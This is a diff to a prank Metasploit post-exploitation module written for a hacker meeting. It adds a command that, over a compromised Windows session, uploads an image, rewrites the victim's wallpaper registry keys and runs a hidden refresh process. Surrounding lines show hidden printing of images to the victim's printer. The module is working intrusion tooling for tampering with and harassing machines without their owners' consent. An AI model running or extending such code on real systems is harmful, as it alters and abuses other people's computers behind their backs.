@@ -11,6 +11,7 @@ class Metasploit3 < Msf::Post
 			'Description'   => %q{
 					We're giving you more than the roll.  We're giving you the whole loaf.
 					This module aims to be a comprehensive Rick Astley Abuse script, because the pimp hand must stay strong.
+					Of course this is last minute shit for the hacker meeting.
 			},
 			'License'       => MSF_LICENSE,
 			'Author'        => [ 'DJ Manila Ice', 'Ian Parker', 'crymsen', 'porkchop', 'BMack'], 
@@ -33,6 +34,8 @@ class Metasploit3 < Msf::Post
 			print_rick_to_default_printer
 		elsif datastore["COMMAND"].eql? "screensaver"
 			install_screensaver	
+		elsif datastore["COMMAND"].eql? "background"
+			change_background
 		else
 			# do this by default for now
 			#make_rick_astley_cursor
@@ -136,5 +139,50 @@ class Metasploit3 < Msf::Post
 		print_status("Printing rick out to the default printer")
 		session.sys.process.execute("cmd.exe /c mspaint.exe /pt \"#{temp_picture}\"", nil, {'Hidden' => true})
 		print_status("Print execution completed!")
+	end
+
+
+	def change_background
+		# straight up mubix's code, no front.  Can't fuck with his code.  Props dude.
+		# http://www.room362.com/scripts-and-programs/metasploit/wallpaper.rb
+		# Change Wallpaper
+
+		session = client
+		key = "HKCU"
+		wallpaper = "rickosuave.bmp"
+		dir  = ::File.join(Msf::Config.install_root, "data", "post")
+		based = ::File.join(dir, wallpaper)
+
+		bgcolor = "0 0 0" # set to 255 255 255 for white
+		refresh_cmd = "rundll32.exe user32.dll, UpdatePerUserSystemParameters"
+		delay = 5
+
+		#Upload Image
+		tempdir = client.fs.file.expand_path("%TEMP%") + "\\" + Rex::Text.rand_text_alpha(rand(8)+8)
+		print_status("Creating a temp dir for wallpaper #{tempdir}...")
+		client.fs.dir.mkdir(tempdir)
+
+		print_status(" >> Uploading #{wallpaper}...")
+
+		fd = client.fs.file.new(tempdir + "\\" + wallpaper, "wb")
+		fd.write(::File.read(based, ::File.size(based)))
+		fd.close
+
+		if(key)
+			registry_setvaldata("#{key}\\Control\ Panel\\Desktop\\","Wallpaper","#{tempdir}\\#{wallpaper}","REG_SZ")
+
+			# Setting the base color isn't working right now
+			# registry_setvaldata("#{key}\\Control\ Panel\\Colors\\","Background","#{bgcolor}","REG_SZ") 
+
+			registry_setvaldata("#{key}\\Control\ Panel\\Desktop\\","TileWallpaper","0","REG_SZ")
+			print_status("Set Wallpaper to #{tempdir}#{wallpaper}")
+		else
+			print_status("Error: failed to open the registry key for writing")
+		end
+
+		#Refresh the users' desktop config
+		r = session.sys.process.execute(refresh_cmd, nil, {'Hidden' => true, 'Channelized' => true})
+		r.channel.close
+		r.close
 	end
 end
